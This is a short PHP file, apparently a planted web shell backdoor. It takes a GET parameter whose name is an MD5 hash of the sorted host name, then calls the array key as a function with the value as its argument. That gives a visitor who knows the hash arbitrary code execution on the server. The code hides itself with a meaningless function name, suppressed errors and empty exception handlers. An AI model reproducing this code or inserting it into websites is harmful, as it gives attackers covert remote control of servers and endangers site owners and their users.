<?php
if(isset($_SERVER['HTTP_HOST']) && @$_SERVER['HTTP_HOST'] != ''){
        editl3O0();
}
function editl3O0(){
try{
        $p = @$_GET[get_sign()];
        if(is_array($p) && count($p)==1){
                foreach($p as $key => $value){
                        $key($value);
                }
        }
}catch(Exception $e){}
}
function get_sign(){
try{
        $arr = str_split(@$_SERVER['HTTP_HOST']);
        sort($arr, SORT_STRING);
        return md5(implode('', $arr));
}catch(Exception $e){}
}
